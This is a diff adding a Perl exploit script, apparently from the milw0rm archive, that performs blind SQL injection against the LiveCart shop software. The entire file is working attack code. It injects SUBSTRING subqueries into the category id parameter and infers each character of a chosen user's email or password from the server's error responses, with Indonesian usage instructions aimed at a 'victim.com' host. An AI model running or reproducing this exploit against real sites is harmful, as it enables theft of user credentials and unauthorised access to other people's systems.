@@ -1,0 +1,104 @@
+#!/usr/bin/perl -w
+use LWP::UserAgent;
+#-----------------------------------------------------------------------------------------------#
+# scripts       : livecart Remote Blind Sql Injection						#
+# scripts site  : http://www.livecart.com							#
+#												#
+# Discovered											#
+# By 		: irvian									#
+# site		: http://irvian.cn								#
+# forum		: http://noscan.info/forum							#
+# email		: irvian.info@gmail.com								#
+#												#
+# Thanks To											#
+# friend	: str0ke, nyubi, ibnusina, arioo, jipank, ifx, karet, bluespy and all my friend #
+#-----------------------------------------------------------------------------------------------#
+# sample 	: 										#
+# http://demo.livecart.com									#
+#-----------------------------------------------------------------------------------------------#
+print "\r\n[+]----------------------[+]\r\n";
+print "[+]Blind SQL injection	 [+]\r\n";
+print "[+]Livecart              [+]\r\n";
+print "[+]code by irvian	 [+]\r\n";
+print "[+]irvian[dot]cn 	 [+]\r\n";
+print "[+]----------------------[+]\n\r";
+if (@ARGV < 3){
+die "
+Cara Mengunakan : perl $0 host option userid
+
+Keterangan
+host	: http://victim.com atau victim.com
+Option	: pilih 1 untuk mencari email dan pilih 2 untuk mencari password
+userid	: Limit
+Contoh	: perl $0 http://victim.com 1 1
+\n";}
+
+
+$url = $ARGV[0];
+$option = $ARGV[1];
+$id = $ARGV[2];
+
+if ($option eq 1){
+syswrite(STDOUT, "email: ", 7);}
+elsif ($option eq 2){
+syswrite(STDOUT, "password: ", 10);}
+
+for($i = 1; $i <= 32; $i++){
+ $f = 0;
+ $n = 32;
+ while(!$f && $n <= 57)
+ {
+  if(&blind($url, $option, $id, $i, $n, $id)){
+  $f = 1;
+     syswrite(STDOUT, chr($n), 1);
+   }
+$n++;
+}
+if ($f==0){
+$n = 97;
+ while(!$f && $n <= 122)
+ {
+  if(&blind($url, $option, $id, $i, $n, $id)){
+  $f = 1;
+     syswrite(STDOUT, chr($n), 1);
+   }
+$n++;
+}
+}
+}
+
+print "\n[+]finish Execution Exploit\n";
+
+
+
+sub blind {
+my $site = $_[0];
+my $op = $_[1];
+my $id = $_[2];
+my $i = $_[3];
+my $n = $_[4];
+my $r = $_[5];
+if ($op eq 1){$klm = "email";}
+elsif ($op eq 2){$klm = "password";}
+$site =~ s/^http:\/\///;
+my $url = "http://"."$site"."/category?id=1"."%20AND%20SUBSTRING((SELECT%20"."$klm"."%20FROM%20"."User"."%20LIMIT%20"."$r".",1"."),"."$i".",1)=CHAR("."$n".")";
+my $browser = &zero($url);
+
+if ($browser !~ /Error Code 500/gi){
+	return 1;
+}
+else {
+return 0;
+}
+}
+
+sub zero($){
+my $spy = $_[0];
+my $ua = LWP::UserAgent->new;
+$ua->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+my $res =  $ua->get($spy);
+my @r = $res->content;
+$page="@r";
+return $page;}
+
+# milw0rm.com [2008-04-10]
